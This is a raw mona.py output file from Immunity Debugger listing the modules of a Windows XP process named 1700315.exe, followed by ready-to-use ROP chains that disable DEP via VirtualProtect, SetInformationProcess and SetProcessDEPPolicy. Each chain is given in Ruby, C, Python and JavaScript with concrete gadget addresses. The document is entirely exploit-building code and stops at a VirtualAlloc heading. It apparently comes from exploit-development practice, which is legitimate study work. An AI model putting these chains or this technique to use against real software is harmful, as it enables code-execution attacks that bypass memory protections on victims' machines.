================================================================================
  Output generated by mona.py v2.0, rev 600 - Immunity Debugger
  Corelan Team - https://www.corelan.be
================================================================================
  OS : xp, release 5.1.2600
  Process being debugged : 1700315 (pid 3532)
  Current mona arguments: rop -m *.dll -cpb '\x00\x0a\x0d'
================================================================================
  2020-07-27 18:31:23
================================================================================
-----------------------------------------------------------------------------------------------------------------------------------------
 Module info :
-----------------------------------------------------------------------------------------------------------------------------------------
 Base       | Top        | Size       | Rebase | SafeSEH | ASLR  | NXCompat | OS Dll | Version, Modulename & Path
-----------------------------------------------------------------------------------------------------------------------------------------
 0x1a400000 | 0x1a532000 | 0x00132000 | False  | True    | False |  False   | True   | 8.00.6001.18702 [urlmon.dll] (C:\WINDOWS\system32\urlmon.dll)
 0x72d20000 | 0x72d29000 | 0x00009000 | False  | True    | False |  False   | True   | 5.1.2600.5512 [wdmaud.drv] (C:\WINDOWS\system32\wdmaud.drv)
 0x77b40000 | 0x77b62000 | 0x00022000 | False  | True    | False |  False   | True   | 5.1.2600.5512 [apphelp.dll] (C:\WINDOWS\system32\apphelp.dll)
 0x77a80000 | 0x77b15000 | 0x00095000 | False  | True    | False |  False   | True   | 5.131.2600.5512 [CRYPT32.dll] (C:\WINDOWS\system32\CRYPT32.dll)
 0x77b20000 | 0x77b32000 | 0x00012000 | False  | True    | False |  False   | True   | 5.1.2600.5512 [MSASN1.dll] (C:\WINDOWS\system32\MSASN1.dll)
 0x7c800000 | 0x7c8f6000 | 0x000f6000 | False  | True    | False |  False   | True   | 5.1.2600.5512 [kernel32.dll] (C:\WINDOWS\system32\kernel32.dll)
 0x77c10000 | 0x77c68000 | 0x00058000 | False  | True    | False |  False   | True   | 7.0.2600.5512 [msvcrt.dll] (C:\WINDOWS\system32\msvcrt.dll)
 0x77e70000 | 0x77f02000 | 0x00092000 | False  | True    | False |  False   | True   | 5.1.2600.5512 [RPCRT4.dll] (C:\WINDOWS\system32\RPCRT4.dll)
 0x7c900000 | 0x7c9af000 | 0x000af000 | False  | True    | False |  False   | True   | 5.1.2600.5512 [ntdll.dll] (C:\WINDOWS\system32\ntdll.dll)
 0x10200000 | 0x10260000 | 0x00060000 | False  | False   | False |  False   | False  | 6.00.8168.0 [MSVCRTD.dll] (C:\Documents and Settings\Administrator\Desktop\MSVCRTD.dll)
 0x5dca0000 | 0x5de88000 | 0x001e8000 | False  | True    | False |  False   | True   | 8.00.6001.18702 [iertutil.dll] (C:\WINDOWS\system32\iertutil.dll)
 0x63000000 | 0x630e6000 | 0x000e6000 | False  | True    | False |  False   | True   | 8.00.6001.18702 [WININET.dll] (C:\WINDOWS\system32\WININET.dll)
 0x77fe0000 | 0x77ff1000 | 0x00011000 | False  | True    | False |  False   | True   | 5.1.2600.5512 [Secur32.dll] (C:\WINDOWS\system32\Secur32.dll)
 0x76390000 | 0x763ad000 | 0x0001d000 | False  | True    | False |  False   | True   | 5.1.2600.5512 [IMM32.DLL] (C:\WINDOWS\system32\IMM32.DLL)
 0x774e0000 | 0x7761d000 | 0x0013d000 | False  | True    | False |  False   | True   | 5.1.2600.5512 [ole32.dll] (C:\WINDOWS\system32\ole32.dll)
 0x77be0000 | 0x77bf5000 | 0x00015000 | False  | True    | False |  False   | True   | 5.1.2600.5512 [MSACM32.dll] (C:\WINDOWS\system32\MSACM32.dll)
 0x7e410000 | 0x7e4a1000 | 0x00091000 | False  | True    | False |  False   | True   | 5.1.2600.5512 [USER32.dll] (C:\WINDOWS\system32\USER32.dll)
 0x72d10000 | 0x72d18000 | 0x00008000 | False  | False   | False |  False   | True   | 5.1.2600.0 [msacm32.drv] (C:\WINDOWS\system32\msacm32.drv)
 0x763b0000 | 0x763f9000 | 0x00049000 | False  | True    | False |  False   | True   | 6.00.2900.5512 [comdlg32.dll] (C:\WINDOWS\system32\comdlg32.dll)
 0x00400000 | 0x0051f000 | 0x0011f000 | False  | False   | False |  False   | False  | -1.0- [1700315.exe] (C:\Documents and Settings\Administrator\Desktop\1700315.exe)
 0x76c90000 | 0x76cb8000 | 0x00028000 | False  | True    | False |  False   | True   | 5.1.2600.5512 [IMAGEHLP.dll] (C:\WINDOWS\system32\IMAGEHLP.dll)
 0x77bd0000 | 0x77bd7000 | 0x00007000 | False  | True    | False |  False   | True   | 5.1.2600.5512 [midimap.dll] (C:\WINDOWS\system32\midimap.dll)
 0x76c30000 | 0x76c5e000 | 0x0002e000 | False  | True    | False |  False   | True   | 5.131.2600.5512 [WINTRUST.dll] (C:\WINDOWS\system32\WINTRUST.dll)
 0x7c9c0000 | 0x7d1d7000 | 0x00817000 | False  | True    | False |  False   | True   | 6.00.2900.5512 [SHELL32.dll] (C:\WINDOWS\system32\SHELL32.dll)
 0x73f10000 | 0x73f6c000 | 0x0005c000 | False  | True    | False |  False   | True   | 5.3.2600.5512 [DSOUND.dll] (C:\WINDOWS\system32\DSOUND.dll)
 0x773d0000 | 0x774d3000 | 0x00103000 | False  | True    | False |  False   | True   | 6.0 [comctl32.dll] (C:\WINDOWS\WinSxS\x86_Microsoft.Windows.Common-Controls_6595b64144ccf1df_6.0.2600.5512_x-ww_35d4ce83\comctl32.dll)
 0x5d090000 | 0x5d12a000 | 0x0009a000 | False  | True    | False |  False   | True   | 5.82 [COMCTL32.dll] (C:\WINDOWS\system32\COMCTL32.dll)
 0x77f60000 | 0x77fd6000 | 0x00076000 | False  | True    | False |  False   | True   | 6.00.2900.5512 [SHLWAPI.dll] (C:\WINDOWS\system32\SHLWAPI.dll)
 0x755c0000 | 0x755ee000 | 0x0002e000 | False  | True    | False |  False   | True   | 5.1.2600.5512 [msctfime.ime] (C:\WINDOWS\system32\msctfime.ime)
 0x74720000 | 0x7476c000 | 0x0004c000 | False  | True    | False |  False   | True   | 5.1.2600.5512 [MSCTF.dll] (C:\WINDOWS\system32\MSCTF.dll)
 0x77c00000 | 0x77c08000 | 0x00008000 | False  | True    | False |  False   | True   | 5.1.2600.5512 [VERSION.dll] (C:\WINDOWS\system32\VERSION.dll)
 0x76b40000 | 0x76b6d000 | 0x0002d000 | False  | True    | False |  False   | True   | 5.1.2600.5512 [WINMM.dll] (C:\WINDOWS\system32\WINMM.dll)
 0x77f10000 | 0x77f59000 | 0x00049000 | False  | True    | False |  False   | True   | 5.1.2600.5512 [GDI32.dll] (C:\WINDOWS\system32\GDI32.dll)
 0x77dd0000 | 0x77e6b000 | 0x0009b000 | False  | True    | False |  False   | True   | 5.1.2600.5512 [ADVAPI32.dll] (C:\WINDOWS\system32\ADVAPI32.dll)
 0x00340000 | 0x00349000 | 0x00009000 | True   | True    | False |  False   | True   | 6.0.5441.0 [Normaliz.dll] (C:\WINDOWS\system32\Normaliz.dll)
 0x77120000 | 0x771ab000 | 0x0008b000 | False  | True    | False |  False   | True   | 5.1.2600.5512 [OLEAUT32.dll] (C:\WINDOWS\system32\OLEAUT32.dll)
-----------------------------------------------------------------------------------------------------------------------------------------

################################################################################

Register setup for VirtualProtect() :
--------------------------------------------
 EAX = NOP (0x90909090)
 ECX = lpOldProtect (ptr to W address)
 EDX = NewProtect (0x40)
 EBX = dwSize
 ESP = lPAddress (automatic)
 EBP = ReturnTo (ptr to jmp esp)
 ESI = ptr to VirtualProtect()
 EDI = ROP NOP (RETN)
 --- alternative chain ---
 EAX = ptr to &VirtualProtect()
 ECX = lpOldProtect (ptr to W address)
 EDX = NewProtect (0x40)
 EBX = dwSize
 ESP = lPAddress (automatic)
 EBP = POP (skip 4 bytes)
 ESI = ptr to JMP [EAX]
 EDI = ROP NOP (RETN)
 + place ptr to "jmp esp" on stack, below PUSHAD
--------------------------------------------


ROP Chain for VirtualProtect() [(XP/2003 Server and up)] :
----------------------------------------------------------

*** [ Ruby ] ***

  def create_rop_chain()

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = 
    [
      #[---INFO:gadgets_to_set_esi:---]
      0x1024701f,  # POP EAX # RETN [MSVCRTD.dll] 
      0x5d091358,  # ptr to &VirtualProtect() [IAT COMCTL32.dll]
      0x7ca3bb60,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [SHELL32.dll] 
      0x76b58c2f,  # XCHG EAX,ESI # RETN [WINMM.dll] 
      #[---INFO:gadgets_to_set_ebp:---]
      0x10209694,  # POP EBP # RETN [MSVCRTD.dll] 
      0x1a473720,  # & push esp # ret  [urlmon.dll]
      #[---INFO:gadgets_to_set_ebx:---]
      0x77c4ded4,  # POP EAX # RETN [msvcrt.dll] 
      0xfffffdff,  # Value to negate, will become 0x00000201
      0x6301540c,  # NEG EAX # RETN [WININET.dll] 
      0x7c9059c8,  # XCHG EAX,EBX # RETN [ntdll.dll] 
      #[---INFO:gadgets_to_set_edx:---]
      0x76c4acea,  # POP EAX # RETN [WINTRUST.dll] 
      0xffffffc0,  # Value to negate, will become 0x00000040
      0x76c9cb6e,  # NEG EAX # RETN [IMAGEHLP.dll] 
      0x7472511f,  # XCHG EAX,EDX # RETN [MSCTF.dll] 
      #[---INFO:gadgets_to_set_ecx:---]
      0x1a4195d6,  # POP ECX # RETN [urlmon.dll] 
      0x76b61d90,  # &Writable location [WINMM.dll]
      #[---INFO:gadgets_to_set_edi:---]
      0x77c479d8,  # POP EDI # RETN [msvcrt.dll] 
      0x7ca82224,  # RETN (ROP NOP) [SHELL32.dll]
      #[---INFO:gadgets_to_set_eax:---]
      0x5de583e6,  # POP EAX # RETN [iertutil.dll] 
      0x90909090,  # nop
      #[---INFO:pushad:---]
      0x77c12df9,  # PUSHAD # RETN [msvcrt.dll] 
    ].flatten.pack("V*")

    return rop_gadgets

  end


  # Call the ROP chain generator inside the 'exploit' function :


  rop_chain = create_rop_chain()



*** [ C ] ***

  #define CREATE_ROP_CHAIN(name, ...) \
    int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \
    unsigned int name[name##_length / sizeof(unsigned int)]; \
    create_rop_chain(name, ##__VA_ARGS__);

  int create_rop_chain(unsigned int *buf, unsigned int )
  {
    // rop chain generated with mona.py - www.corelan.be
    unsigned int rop_gadgets[] = {
      //[---INFO:gadgets_to_set_esi:---]
      0x1024701f,  // POP EAX // RETN [MSVCRTD.dll] 
      0x5d091358,  // ptr to &VirtualProtect() [IAT COMCTL32.dll]
      0x7ca3bb60,  // MOV EAX,DWORD PTR DS:[EAX] // RETN [SHELL32.dll] 
      0x76b58c2f,  // XCHG EAX,ESI // RETN [WINMM.dll] 
      //[---INFO:gadgets_to_set_ebp:---]
      0x10209694,  // POP EBP // RETN [MSVCRTD.dll] 
      0x1a473720,  // & push esp // ret  [urlmon.dll]
      //[---INFO:gadgets_to_set_ebx:---]
      0x77c4ded4,  // POP EAX // RETN [msvcrt.dll] 
      0xfffffdff,  // Value to negate, will become 0x00000201
      0x6301540c,  // NEG EAX // RETN [WININET.dll] 
      0x7c9059c8,  // XCHG EAX,EBX // RETN [ntdll.dll] 
      //[---INFO:gadgets_to_set_edx:---]
      0x76c4acea,  // POP EAX // RETN [WINTRUST.dll] 
      0xffffffc0,  // Value to negate, will become 0x00000040
      0x76c9cb6e,  // NEG EAX // RETN [IMAGEHLP.dll] 
      0x7472511f,  // XCHG EAX,EDX // RETN [MSCTF.dll] 
      //[---INFO:gadgets_to_set_ecx:---]
      0x1a4195d6,  // POP ECX // RETN [urlmon.dll] 
      0x76b61d90,  // &Writable location [WINMM.dll]
      //[---INFO:gadgets_to_set_edi:---]
      0x77c479d8,  // POP EDI // RETN [msvcrt.dll] 
      0x7ca82224,  // RETN (ROP NOP) [SHELL32.dll]
      //[---INFO:gadgets_to_set_eax:---]
      0x5de583e6,  // POP EAX // RETN [iertutil.dll] 
      0x90909090,  // nop
      //[---INFO:pushad:---]
      0x77c12df9,  // PUSHAD // RETN [msvcrt.dll] 
    };
    if(buf != NULL) {
      memcpy(buf, rop_gadgets, sizeof(rop_gadgets));
    };
    return sizeof(rop_gadgets);
  }

  // use the 'rop_chain' variable after this call, it's just an unsigned int[]
  CREATE_ROP_CHAIN(rop_chain, );
  // alternatively just allocate a large enough buffer and get the rop chain, i.e.:
  // unsigned int rop_chain[256];
  // int rop_chain_length = create_rop_chain(rop_chain, );

*** [ Python ] ***

  def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
      #[---INFO:gadgets_to_set_esi:---]
      0x1024701f,  # POP EAX # RETN [MSVCRTD.dll] 
      0x5d091358,  # ptr to &VirtualProtect() [IAT COMCTL32.dll]
      0x7ca3bb60,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [SHELL32.dll] 
      0x76b58c2f,  # XCHG EAX,ESI # RETN [WINMM.dll] 
      #[---INFO:gadgets_to_set_ebp:---]
      0x10209694,  # POP EBP # RETN [MSVCRTD.dll] 
      0x1a473720,  # & push esp # ret  [urlmon.dll]
      #[---INFO:gadgets_to_set_ebx:---]
      0x77c4ded4,  # POP EAX # RETN [msvcrt.dll] 
      0xfffffdff,  # Value to negate, will become 0x00000201
      0x6301540c,  # NEG EAX # RETN [WININET.dll] 
      0x7c9059c8,  # XCHG EAX,EBX # RETN [ntdll.dll] 
      #[---INFO:gadgets_to_set_edx:---]
      0x76c4acea,  # POP EAX # RETN [WINTRUST.dll] 
      0xffffffc0,  # Value to negate, will become 0x00000040
      0x76c9cb6e,  # NEG EAX # RETN [IMAGEHLP.dll] 
      0x7472511f,  # XCHG EAX,EDX # RETN [MSCTF.dll] 
      #[---INFO:gadgets_to_set_ecx:---]
      0x1a4195d6,  # POP ECX # RETN [urlmon.dll] 
      0x76b61d90,  # &Writable location [WINMM.dll]
      #[---INFO:gadgets_to_set_edi:---]
      0x77c479d8,  # POP EDI # RETN [msvcrt.dll] 
      0x7ca82224,  # RETN (ROP NOP) [SHELL32.dll]
      #[---INFO:gadgets_to_set_eax:---]
      0x5de583e6,  # POP EAX # RETN [iertutil.dll] 
      0x90909090,  # nop
      #[---INFO:pushad:---]
      0x77c12df9,  # PUSHAD # RETN [msvcrt.dll] 
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

  rop_chain = create_rop_chain()



*** [ JavaScript ] ***

  //rop chain generated with mona.py - www.corelan.be
  rop_gadgets = unescape(
    "" + // #[---INFO:gadgets_to_set_esi:---] : 
    "%u701f%u1024" + // 0x1024701f : ,# POP EAX # RETN [MSVCRTD.dll] 
    "%u1358%u5d09" + // 0x5d091358 : ,# ptr to &VirtualProtect() [IAT COMCTL32.dll]
    "%ubb60%u7ca3" + // 0x7ca3bb60 : ,# MOV EAX,DWORD PTR DS:[EAX] # RETN [SHELL32.dll] 
    "%u8c2f%u76b5" + // 0x76b58c2f : ,# XCHG EAX,ESI # RETN [WINMM.dll] 
    "" + // #[---INFO:gadgets_to_set_ebp:---] : 
    "%u9694%u1020" + // 0x10209694 : ,# POP EBP # RETN [MSVCRTD.dll] 
    "%u3720%u1a47" + // 0x1a473720 : ,# & push esp # ret[urlmon.dll]
    "" + // #[---INFO:gadgets_to_set_ebx:---] : 
    "%uded4%u77c4" + // 0x77c4ded4 : ,# POP EAX # RETN [msvcrt.dll] 
    "%ufdff%uffff" + // 0xfffffdff : ,# Value to negate, will become 0x00000201
    "%u540c%u6301" + // 0x6301540c : ,# NEG EAX # RETN [WININET.dll] 
    "%u59c8%u7c90" + // 0x7c9059c8 : ,# XCHG EAX,EBX # RETN [ntdll.dll] 
    "" + // #[---INFO:gadgets_to_set_edx:---] : 
    "%uacea%u76c4" + // 0x76c4acea : ,# POP EAX # RETN [WINTRUST.dll] 
    "%uffc0%uffff" + // 0xffffffc0 : ,# Value to negate, will become 0x00000040
    "%ucb6e%u76c9" + // 0x76c9cb6e : ,# NEG EAX # RETN [IMAGEHLP.dll] 
    "%u511f%u7472" + // 0x7472511f : ,# XCHG EAX,EDX # RETN [MSCTF.dll] 
    "" + // #[---INFO:gadgets_to_set_ecx:---] : 
    "%u95d6%u1a41" + // 0x1a4195d6 : ,# POP ECX # RETN [urlmon.dll] 
    "%u1d90%u76b6" + // 0x76b61d90 : ,# &Writable location [WINMM.dll]
    "" + // #[---INFO:gadgets_to_set_edi:---] : 
    "%u79d8%u77c4" + // 0x77c479d8 : ,# POP EDI # RETN [msvcrt.dll] 
    "%u2224%u7ca8" + // 0x7ca82224 : ,# RETN (ROP NOP) [SHELL32.dll]
    "" + // #[---INFO:gadgets_to_set_eax:---] : 
    "%u83e6%u5de5" + // 0x5de583e6 : ,# POP EAX # RETN [iertutil.dll] 
    "%u9090%u9090" + // 0x90909090 : ,# nop
    "" + // #[---INFO:pushad:---] : 
    "%u2df9%u77c1" + // 0x77c12df9 : ,# PUSHAD # RETN [msvcrt.dll] 
    ""); //  : 


--------------------------------------------------------------------------------------------------


################################################################################

Register setup for SetInformationProcess() :
--------------------------------------------
 EAX = SizeOf(ExecuteFlags) (0x4)
 ECX = &ExecuteFlags (ptr to 0x00000002)
 EDX = ProcessExecuteFlags (0x22)
 EBX = NtCurrentProcess (0xffffffff)
 ESP = ReturnTo (automatic)
 EBP = ptr to NtSetInformationProcess()
 ESI = <not used>
 EDI = ROP NOP (4 byte stackpivot)
--------------------------------------------


ROP Chain for SetInformationProcess() [(XP/2003 Server only)] :
---------------------------------------------------------------

*** [ Ruby ] ***

  def create_rop_chain()

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = 
    [
      #[---INFO:gadgets_to_set_ebp:---]
      0x77c45d17,  # POP ECX # RETN [msvcrt.dll] 
      0x7c801224,  # ptr to &SetInformationProcess() [IAT kernel32.dll]
      0x7e41927f,  # MOV EAX,DWORD PTR DS:[ECX] # RETN [USER32.dll] 
      0x77f68fd9,  # XCHG EAX,EBP # RETN [SHLWAPI.dll] 
      #[---INFO:gadgets_to_set_edx:---]
      0x7cb46078,  # POP EAX # RETN [SHELL32.dll] 
      0xffffffde,  # Value to negate, will become 0x00000022
      0x630153c6,  # NEG EAX # RETN [WININET.dll] 
      0x7472511f,  # XCHG EAX,EDX # RETN [MSCTF.dll] 
      #[---INFO:gadgets_to_set_ecx:---]
      0x77c422bf,  # POP ECX # RETN [msvcrt.dll] 
      0x1a4d5090,  # &0x00000002 [urlmon.dll]
      #[---INFO:gadgets_to_set_ebx:---]
      0x7ca0779d,  # POP EBX # RETN [SHELL32.dll] 
      0xffffffff,  # 0xffffffff-> ebx
      #[---INFO:gadgets_to_set_eax:---]
      0x1a44eb34,  # POP EAX # RETN [urlmon.dll] 
      0xfffffffc,  # Value to negate, will become 0x00000004
      0x77dd9b06,  # NEG EAX # RETN [ADVAPI32.dll] 
      #[---INFO:gadgets_to_set_edi:---]
      0x7c90e7d5,  # POP EDI # RETN [ntdll.dll] 
      0x7c90e7d5,  # skip 4 bytes [ntdll.dll]
      #[---INFO:pushad:---]
      0x77dfc5ee,  # PUSHAD # RETN [ADVAPI32.dll] 
    ].flatten.pack("V*")

    return rop_gadgets

  end


  # Call the ROP chain generator inside the 'exploit' function :


  rop_chain = create_rop_chain()



*** [ C ] ***

  #define CREATE_ROP_CHAIN(name, ...) \
    int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \
    unsigned int name[name##_length / sizeof(unsigned int)]; \
    create_rop_chain(name, ##__VA_ARGS__);

  int create_rop_chain(unsigned int *buf, unsigned int )
  {
    // rop chain generated with mona.py - www.corelan.be
    unsigned int rop_gadgets[] = {
      //[---INFO:gadgets_to_set_ebp:---]
      0x77c45d17,  // POP ECX // RETN [msvcrt.dll] 
      0x7c801224,  // ptr to &SetInformationProcess() [IAT kernel32.dll]
      0x7e41927f,  // MOV EAX,DWORD PTR DS:[ECX] // RETN [USER32.dll] 
      0x77f68fd9,  // XCHG EAX,EBP // RETN [SHLWAPI.dll] 
      //[---INFO:gadgets_to_set_edx:---]
      0x7cb46078,  // POP EAX // RETN [SHELL32.dll] 
      0xffffffde,  // Value to negate, will become 0x00000022
      0x630153c6,  // NEG EAX // RETN [WININET.dll] 
      0x7472511f,  // XCHG EAX,EDX // RETN [MSCTF.dll] 
      //[---INFO:gadgets_to_set_ecx:---]
      0x77c422bf,  // POP ECX // RETN [msvcrt.dll] 
      0x1a4d5090,  // &0x00000002 [urlmon.dll]
      //[---INFO:gadgets_to_set_ebx:---]
      0x7ca0779d,  // POP EBX // RETN [SHELL32.dll] 
      0xffffffff,  // 0xffffffff-> ebx
      //[---INFO:gadgets_to_set_eax:---]
      0x1a44eb34,  // POP EAX // RETN [urlmon.dll] 
      0xfffffffc,  // Value to negate, will become 0x00000004
      0x77dd9b06,  // NEG EAX // RETN [ADVAPI32.dll] 
      //[---INFO:gadgets_to_set_edi:---]
      0x7c90e7d5,  // POP EDI // RETN [ntdll.dll] 
      0x7c90e7d5,  // skip 4 bytes [ntdll.dll]
      //[---INFO:pushad:---]
      0x77dfc5ee,  // PUSHAD // RETN [ADVAPI32.dll] 
    };
    if(buf != NULL) {
      memcpy(buf, rop_gadgets, sizeof(rop_gadgets));
    };
    return sizeof(rop_gadgets);
  }

  // use the 'rop_chain' variable after this call, it's just an unsigned int[]
  CREATE_ROP_CHAIN(rop_chain, );
  // alternatively just allocate a large enough buffer and get the rop chain, i.e.:
  // unsigned int rop_chain[256];
  // int rop_chain_length = create_rop_chain(rop_chain, );

*** [ Python ] ***

  def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
      #[---INFO:gadgets_to_set_ebp:---]
      0x77c45d17,  # POP ECX # RETN [msvcrt.dll] 
      0x7c801224,  # ptr to &SetInformationProcess() [IAT kernel32.dll]
      0x7e41927f,  # MOV EAX,DWORD PTR DS:[ECX] # RETN [USER32.dll] 
      0x77f68fd9,  # XCHG EAX,EBP # RETN [SHLWAPI.dll] 
      #[---INFO:gadgets_to_set_edx:---]
      0x7cb46078,  # POP EAX # RETN [SHELL32.dll] 
      0xffffffde,  # Value to negate, will become 0x00000022
      0x630153c6,  # NEG EAX # RETN [WININET.dll] 
      0x7472511f,  # XCHG EAX,EDX # RETN [MSCTF.dll] 
      #[---INFO:gadgets_to_set_ecx:---]
      0x77c422bf,  # POP ECX # RETN [msvcrt.dll] 
      0x1a4d5090,  # &0x00000002 [urlmon.dll]
      #[---INFO:gadgets_to_set_ebx:---]
      0x7ca0779d,  # POP EBX # RETN [SHELL32.dll] 
      0xffffffff,  # 0xffffffff-> ebx
      #[---INFO:gadgets_to_set_eax:---]
      0x1a44eb34,  # POP EAX # RETN [urlmon.dll] 
      0xfffffffc,  # Value to negate, will become 0x00000004
      0x77dd9b06,  # NEG EAX # RETN [ADVAPI32.dll] 
      #[---INFO:gadgets_to_set_edi:---]
      0x7c90e7d5,  # POP EDI # RETN [ntdll.dll] 
      0x7c90e7d5,  # skip 4 bytes [ntdll.dll]
      #[---INFO:pushad:---]
      0x77dfc5ee,  # PUSHAD # RETN [ADVAPI32.dll] 
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

  rop_chain = create_rop_chain()



*** [ JavaScript ] ***

  //rop chain generated with mona.py - www.corelan.be
  rop_gadgets = unescape(
    "" + // #[---INFO:gadgets_to_set_ebp:---] : 
    "%u5d17%u77c4" + // 0x77c45d17 : ,# POP ECX # RETN [msvcrt.dll] 
    "%u1224%u7c80" + // 0x7c801224 : ,# ptr to &SetInformationProcess() [IAT kernel32.dll]
    "%u927f%u7e41" + // 0x7e41927f : ,# MOV EAX,DWORD PTR DS:[ECX] # RETN [USER32.dll] 
    "%u8fd9%u77f6" + // 0x77f68fd9 : ,# XCHG EAX,EBP # RETN [SHLWAPI.dll] 
    "" + // #[---INFO:gadgets_to_set_edx:---] : 
    "%u6078%u7cb4" + // 0x7cb46078 : ,# POP EAX # RETN [SHELL32.dll] 
    "%uffde%uffff" + // 0xffffffde : ,# Value to negate, will become 0x00000022
    "%u53c6%u6301" + // 0x630153c6 : ,# NEG EAX # RETN [WININET.dll] 
    "%u511f%u7472" + // 0x7472511f : ,# XCHG EAX,EDX # RETN [MSCTF.dll] 
    "" + // #[---INFO:gadgets_to_set_ecx:---] : 
    "%u22bf%u77c4" + // 0x77c422bf : ,# POP ECX # RETN [msvcrt.dll] 
    "%u5090%u1a4d" + // 0x1a4d5090 : ,# &0x00000002 [urlmon.dll]
    "" + // #[---INFO:gadgets_to_set_ebx:---] : 
    "%u779d%u7ca0" + // 0x7ca0779d : ,# POP EBX # RETN [SHELL32.dll] 
    "%uffff%uffff" + // 0xffffffff : ,# 0xffffffff-> ebx
    "" + // #[---INFO:gadgets_to_set_eax:---] : 
    "%ueb34%u1a44" + // 0x1a44eb34 : ,# POP EAX # RETN [urlmon.dll] 
    "%ufffc%uffff" + // 0xfffffffc : ,# Value to negate, will become 0x00000004
    "%u9b06%u77dd" + // 0x77dd9b06 : ,# NEG EAX # RETN [ADVAPI32.dll] 
    "" + // #[---INFO:gadgets_to_set_edi:---] : 
    "%ue7d5%u7c90" + // 0x7c90e7d5 : ,# POP EDI # RETN [ntdll.dll] 
    "%ue7d5%u7c90" + // 0x7c90e7d5 : ,# skip 4 bytes [ntdll.dll]
    "" + // #[---INFO:pushad:---] : 
    "%uc5ee%u77df" + // 0x77dfc5ee : ,# PUSHAD # RETN [ADVAPI32.dll] 
    ""); //  : 


--------------------------------------------------------------------------------------------------


################################################################################

Register setup for SetProcessDEPPolicy() :
--------------------------------------------
 EAX = <not used>
 ECX = <not used>
 EDX = <not used>
 EBX = dwFlags (ptr to 0x00000000)
 ESP = ReturnTo (automatic)
 EBP = ptr to SetProcessDEPPolicy()
 ESI = <not used>
 EDI = ROP NOP (4 byte stackpivot)
--------------------------------------------


ROP Chain for SetProcessDEPPolicy() [(XP SP3/Vista SP1/2008 Server SP1, can be called only once per process)] :
---------------------------------------------------------------------------------------------------------------

*** [ Ruby ] ***

  def create_rop_chain()

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = 
    [
      #[---INFO:gadgets_to_set_ebp:---]
      0x76c9347b,  # POP EBP # RETN [IMAGEHLP.dll] 
      0x7c862144,  # SetProcessDEPPolicy() [kernel32.dll]
      #[---INFO:gadgets_to_set_ebx:---]
      0x63019aba,  # POP EBX # RETN [WININET.dll] 
      0x1a4c8088,  # &0x00000000 [urlmon.dll]
      #[---INFO:gadgets_to_set_edi:---]
      0x7c914f32,  # POP EDI # RETN [ntdll.dll] 
      0x7c914f32,  # skip 4 bytes [ntdll.dll]
      #[---INFO:pushad:---]
      0x7719576d,  # PUSHAD # RETN [OLEAUT32.dll] 
    ].flatten.pack("V*")

    return rop_gadgets

  end


  # Call the ROP chain generator inside the 'exploit' function :


  rop_chain = create_rop_chain()



*** [ C ] ***

  #define CREATE_ROP_CHAIN(name, ...) \
    int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \
    unsigned int name[name##_length / sizeof(unsigned int)]; \
    create_rop_chain(name, ##__VA_ARGS__);

  int create_rop_chain(unsigned int *buf, unsigned int )
  {
    // rop chain generated with mona.py - www.corelan.be
    unsigned int rop_gadgets[] = {
      //[---INFO:gadgets_to_set_ebp:---]
      0x76c9347b,  // POP EBP // RETN [IMAGEHLP.dll] 
      0x7c862144,  // SetProcessDEPPolicy() [kernel32.dll]
      //[---INFO:gadgets_to_set_ebx:---]
      0x63019aba,  // POP EBX // RETN [WININET.dll] 
      0x1a4c8088,  // &0x00000000 [urlmon.dll]
      //[---INFO:gadgets_to_set_edi:---]
      0x7c914f32,  // POP EDI // RETN [ntdll.dll] 
      0x7c914f32,  // skip 4 bytes [ntdll.dll]
      //[---INFO:pushad:---]
      0x7719576d,  // PUSHAD // RETN [OLEAUT32.dll] 
    };
    if(buf != NULL) {
      memcpy(buf, rop_gadgets, sizeof(rop_gadgets));
    };
    return sizeof(rop_gadgets);
  }

  // use the 'rop_chain' variable after this call, it's just an unsigned int[]
  CREATE_ROP_CHAIN(rop_chain, );
  // alternatively just allocate a large enough buffer and get the rop chain, i.e.:
  // unsigned int rop_chain[256];
  // int rop_chain_length = create_rop_chain(rop_chain, );

*** [ Python ] ***

  def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
      #[---INFO:gadgets_to_set_ebp:---]
      0x76c9347b,  # POP EBP # RETN [IMAGEHLP.dll] 
      0x7c862144,  # SetProcessDEPPolicy() [kernel32.dll]
      #[---INFO:gadgets_to_set_ebx:---]
      0x63019aba,  # POP EBX # RETN [WININET.dll] 
      0x1a4c8088,  # &0x00000000 [urlmon.dll]
      #[---INFO:gadgets_to_set_edi:---]
      0x7c914f32,  # POP EDI # RETN [ntdll.dll] 
      0x7c914f32,  # skip 4 bytes [ntdll.dll]
      #[---INFO:pushad:---]
      0x7719576d,  # PUSHAD # RETN [OLEAUT32.dll] 
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

  rop_chain = create_rop_chain()



*** [ JavaScript ] ***

  //rop chain generated with mona.py - www.corelan.be
  rop_gadgets = unescape(
    "" + // #[---INFO:gadgets_to_set_ebp:---] : 
    "%u347b%u76c9" + // 0x76c9347b : ,# POP EBP # RETN [IMAGEHLP.dll] 
    "%u2144%u7c86" + // 0x7c862144 : ,# SetProcessDEPPolicy() [kernel32.dll]
    "" + // #[---INFO:gadgets_to_set_ebx:---] : 
    "%u9aba%u6301" + // 0x63019aba : ,# POP EBX # RETN [WININET.dll] 
    "%u8088%u1a4c" + // 0x1a4c8088 : ,# &0x00000000 [urlmon.dll]
    "" + // #[---INFO:gadgets_to_set_edi:---] : 
    "%u4f32%u7c91" + // 0x7c914f32 : ,# POP EDI # RETN [ntdll.dll] 
    "%u4f32%u7c91" + // 0x7c914f32 : ,# skip 4 bytes [ntdll.dll]
    "" + // #[---INFO:pushad:---] : 
    "%u576d%u7719" + // 0x7719576d : ,# PUSHAD # RETN [OLEAUT32.dll] 
    ""); //  : 


--------------------------------------------------------------------------------------------------


################################################################################

Register setup for VirtualAlloc() :
--------------------------------------------
